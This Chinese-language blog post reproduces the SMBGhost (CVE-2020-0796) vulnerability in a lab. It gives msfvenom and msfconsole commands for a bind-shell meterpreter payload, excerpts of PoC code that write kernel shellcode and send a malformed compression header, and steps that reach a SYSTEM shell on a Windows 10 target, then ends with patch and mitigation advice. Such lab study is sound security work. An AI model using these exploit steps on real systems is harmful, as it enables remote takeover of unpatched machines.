---
title: 漏洞复现
date: 2023-02-23 19:38:44
tags:
---
# <center>永恒之黑(CVE-2020-0796)漏洞复现及研究 </center>

# <center>SMBGhost

## <center> Thorin </center> </center>

---

## 1.1 简介

2020年3月12日，微软正式发布CVE-2020-0796高危漏洞补丁，**本漏洞源于SMBv3没有正确处理压缩的数据包，在解压数据包的时候使用客户端传过来的长度进行解压时，并没有检查长度是否合法，最终导致整数溢出。** 利用该漏洞，攻击方可直接远程攻击SMB服务端远程执行任意恶意代码，CVE-2020-0796漏洞与“永恒之蓝”系列漏洞极为相似，都是利用Windows SMB漏洞远程攻击获取系统最高权限。

## 1.2 受影响版本

适用于32位系统的Windows 10版本1903        
Windows 10 1903版（用于基于x64的系统）     
Windows 10 1903版（用于基于ARM64的系统）     
Windows Server 1903版（服务器核心安装）    
适用于32位系统的Windows 10版本1909    
Windows 10版本1909（用于基于x64的系统）   
Windows 10 1909版（用于基于ARM64的系统）  
Windows Server版本1909（服务器核心安装） 

## 1.3  SMBGhost原理及特性

SMBGhost （或 CVE -2020-0796） 是Microsoft Server Message Block 3.0 (SMBv3)中的一个漏洞，SMBv3 是该公司引入其较新操作系统的一种协议。此通信协议允许在互连的计算机网络中共享访问文件、数据和其他资产。 

SMBGhost漏洞影响 SMBv3（版本 3.1.1）的压缩功能并暴露运行 Windows 10（1903 和 1909）和 Windows Server（1903、1909）的系统。较旧版本的 Windows 操作系统（例如 Windows 7 和 8）不存在此漏洞的风险，因为它们不支持 SMBv3 压缩。 

SMBGhost具有蠕虫功能，因为它能够通过 SMBv3（版本 3.1.1）在网络共享上传播和复制。**为了利用此漏洞，威胁行为者会向易受攻击的服务器发送特制的 SMBv3 数据包，并诱使用户连接到受感染的服务器。成功的利用使攻击者能够在目标 SMB 服务器上执行代码。**

## 2.1 环境配置

<center>靶机：Windows 10版本1903（用于基于x64的系统) 


**注意关闭防火墙**
![](https://blog-pic-thorin.oss-cn-hangzhou.aliyuncs.com/%E5%9B%BE%E7%89%871_1.png)

![](https://blog-pic-thorin.oss-cn-hangzhou.aliyuncs.com/%E5%9B%BE%E7%89%872_1.png)

攻击机 ： kali-linux-2023.1-vmware-amd64.vmx

(安装成功直接在虚拟机中打开，账号密码都是kali，成功后界面如下）

![](https://blog-pic-thorin.oss-cn-hangzhou.aliyuncs.com/%E5%9B%BE%E7%89%873.png)

虚拟机： VMware Workstation 16 Pro 

*本文主要介绍对漏洞的蓝屏复现以及远程控制复现以及前期的漏洞验证* </center>

## 2.2 获取靶机以及攻击机的IP地址

<center>

靶机： 打开cmd  输入  `ipconfig`

![](https://blog-pic-thorin.oss-cn-hangzhou.aliyuncs.com/%E5%9B%BE%E7%89%874.png)

得到IP地址为：198.168.208.128

攻击机： alt+f2 并输入`qterminal` 打开终端
   输入`ifconfig`

![](https://blog-pic-thorin.oss-cn-hangzhou.aliyuncs.com/%E5%9B%BE%E7%89%875.png)

得到IP地址为：198.168.208.129
</center>

## 2.3 前期验证漏洞存在性
<center>

![](https://blog-pic-thorin.oss-cn-hangzhou.aliyuncs.com/%E5%9B%BE%E7%89%876.png)

利用检测脚本 CVE-2020-0796-Scanner 确认漏洞存在

看到警告证明漏洞存在
</center>

## 2.4 蓝屏攻击复现

<center>下载蓝屏攻击脚本并放入虚拟机

![](https://blog-pic-thorin.oss-cn-hangzhou.aliyuncs.com/%E5%9B%BE%E7%89%877.png)

执行代码 `Python3 CVE-2020-0796.py ip` 即可完成攻击

![](https://blog-pic-thorin.oss-cn-hangzhou.aliyuncs.com/%E5%9B%BE%E7%89%878.png)

成功实现蓝屏
</center>

## 2.5 远程监听复现

<center>将SMBGhost_RCE_PoC-master脚本下载至虚拟机执行</center>
</center>

``` shell
msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=4444 -b '\x00' -i 1 -f python
```

<center>
然后替换POC中exploit.py中USER_PAYLOAD的代码，并且将buf修改为USER_PAYLOAD

![](https://blog-pic-thorin.oss-cn-hangzhou.aliyuncs.com/%E5%9B%BE%E7%89%879.png)

将调整好的exploit.py放回虚拟机

打开新的qterminal 输入`msfconsole`

![](https://blog-pic-thorin.oss-cn-hangzhou.aliyuncs.com/%E5%9B%BE%E7%89%8710.png)

输入如下代码 </center>

```shell
use exploit/multi/handler
set payload windows/x64/meterpreter/bind_tcp
set lport 4444 //监听端口
set rhost 192.168.208.128 //目标主机
run
```

<center>

![](https://blog-pic-thorin.oss-cn-hangzhou.aliyuncs.com/%E5%9B%BE%E7%89%8711.png)

![](https://blog-pic-thorin.oss-cn-hangzhou.aliyuncs.com/%E5%9B%BE%E7%89%8712.png)

在输入run之前 先执行`python exploit.py ip`

![](https://blog-pic-thorin.oss-cn-hangzhou.aliyuncs.com/%E5%9B%BE%E7%89%8713.png)

出现 `meterpreter` 后输入`shell `
即成功反弹`shell`实现远程监听

![](https://blog-pic-thorin.oss-cn-hangzhou.aliyuncs.com/%E5%9B%BE%E7%89%8714.png)

输入`whoami`后发现获取了`authority\system`权限

![](https://blog-pic-thorin.oss-cn-hangzhou.aliyuncs.com/%E5%9B%BE%E7%89%8715.png)

</center>

<br>


## 3.1 漏洞分析及复现脚本分析

### 3.1.1 对蓝屏攻击时的内存转储文件分析并进行栈回溯：

```
kd> kn# Child-SP          RetAddr           Call Site
0b fffff904`bd3a2dd0 fffff806`1b97e5ae nt!ExFreePool+0x9
0c fffff904`bd3a2e00 fffff806`1b9d7f41 srvnet!SmbCompressionDecompress+0xfe
0d fffff904`bd3a2e70 fffff806`1b9d699e srv2+0x17f41
0e fffff904`bd3a2ed0 fffff806`1ba19a9f srv2+0x1699e
0f fffff904`bd3a2f00 fffff806`1cdc496e srv2+0x59a9f
```
    
<center>

如上文0x0C号栈帧所示，`srvnet` 模块中的 `SmbCompressionDecompress` 函数在调用 `ExFreePoo` 是触发蓝屏的直接因素。

最后我们定位到了内存复制函数`qmemcpy`，发现其在写入数据大小范围内有其他的Pool块时，将会导致`ExFreePoolWithTag()`时出错

![](https://blog-pic-thorin.oss-cn-hangzhou.aliyuncs.com/%E5%9B%BE%E7%89%8716.png)

**在SMB进行数据解压造成内存溢出时，攻击者就获得了一次任意地址写入任意数据的能力。**  

![](https://blog-pic-thorin.oss-cn-hangzhou.aliyuncs.com/%E5%9B%BE%E7%89%8717.png)

![](https://blog-pic-thorin.oss-cn-hangzhou.aliyuncs.com/%E5%9B%BE%E7%89%8718.png)
</center>

### 3.2.1 远程控制攻击思路

#### （1） 验证程序首先创建到SMS server的会话连接（记为session）。

#### （2）验证程序获取自身token数据结构中privilege成员在内核中的地址（记tokenAddr）。

#### （3）验证程序通过session发送畸形压缩数据（记为evilData）给SMB server触发漏洞。其中，evilData包含tokenAddr、权限数据、溢出占位数据。

#### （4） SMS server收到evilData后触发漏洞，并修改tokenAddr地址处的权限数据，从而提升验证程序的权限。

#### （5）验证程序获取权限后对winlogon进行控制，来创建system用户shell。
<center>

 以下是在有了任意物理内存读，然后通过在物理页面暴力搜索找到HAL的堆地址，然后从`HAL`的堆地址中找到`HalpInterruptController`和`HalpApicRequestInterrupt`两个值来构造内核态的Shellcode </center>

```py
def build_shellcode():
    global KERNEL_SHELLCODE
    KERNEL_SHELLCODE += struct.pack("<Q", PHALP_INTERRUPT +
                                    HALP_APIC_REQ_INTERRUPT_OFFSET)
    KERNEL_SHELLCODE += struct.pack("<Q", PHALP_APIC_INTERRUPT)
    KERNEL_SHELLCODE += USER_PAYLOAD
```

<center>

通过任意内存写操作将构造好的`ShellCode`写到`KUSER_SHARED_DATA`地址上。最终通过任意内存写操作将指令指针（`PHALP_INTERRUPT` + `HALP_APIC_REQ_INTERRUPT_OFFSET`）指向`KUSER_SHARED_DATA`地址上的`ShellCode`去执行。</center>

```py
to_write = len(KERNEL_SHELLCODE)
    write_bytes = 0
    while write_bytes < to_write:
        write_sz = min([write_unit, to_write - write_bytes])
        write_primitive(ip, port, KERNEL_SHELLCODE[write_bytes:write_bytes + write_sz], pshellcodeva + write_bytes)
        write_bytes += write_sz
    
    print("[+] Wrote shellcode at %lx!" % pshellcodeva)

    input("[+] Press a key to execute shellcode!")
    
    write_primitive(ip, port, struct.pack("<Q", pshellcodeva), PHALP_INTERRUPT + HALP_APIC_REQ_INTERRUPT_OFFSET)
    print("[+] overwrote HalpInterruptController pointer, should have execution shortly...")
```

### 3.1.2 蓝屏攻击原理

<center>该脚本连接到目标主机，并在转换头中设置了错误的偏移量字段的情况下压缩了身份验证请求，从而导致解压缩器缓冲溢出并导致目标崩溃</center>

```py
def _compress(self, b_data, session):
        header = SMB2CompressionTransformHeader()
        header['original_size'] = len(b_data)
        header['offset'] = 4294967295
        header['data'] = smbprotocol.lznt1.compress(b_data)
```

<br>

## 4.1 修复建议

#### 4.1.1.安装官方补丁

微软已经发布了此漏洞的安全补丁，访问如下链接：<https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0796>
给对应的系统打微软出的最新补丁

#### 4.1.2.禁用SMBv3压缩

禁用SMB 3.0的压缩功能，是否使用需要结合自己业务进行判断。

使用以下PowerShell命令禁用压缩功能，以阻止未经身份验证的攻击者利用SMBv3 服务器的漏洞。

```shell
Set-ItemProperty-Path “HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\
Parameters” DisableCompression -Type DWORD -Value 1 -Force
```

用户可通过以下PowerShell命令撤销禁用压缩功能

```shell
Set-ItemProperty-Path “HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\
Parameters” DisableCompression -Type DWORD -Value 0 -Force
```

注：利用以上命令进行更改后，无需重启即可生效；该方法仅可用来防护针对SMB服务器（SMB SERVER）的攻击，无法对SMB客户端（SMB Client）进行防护。

#### 4.1.3.设置防火墙策略关闭相关端口
SMB的TCP 445端口
NetBIOS名称解析的UDP 137端口
NetBIOS数据图服务的UDP 138端口
NetBIOS会话服务的TCP 139端口

####  4.1.4.通过IP安全策略屏蔽危险端口，bat执行添加防火墙策略，关闭危险服务
<http://www.piis.cn/news/new1614.asp>


<br>

## Reference </center> </center> 

[1]漏洞检测工具： <http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip>

[2]蓝屏攻击poc：<https://github.com/eerykitty/CVE-2020-0796-PoC>

[3]shell监听脚本：<https://github.com/chompie1337/SMBGhost_RCE_PoC>

[4]关于SMBGhost的原理分析 ：<https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2020-0796>

[5]关于复现的技术：CVE-2020-0796永恒之黑漏洞浅谈与利用-阿里云开发者社区 (aliyun.com)



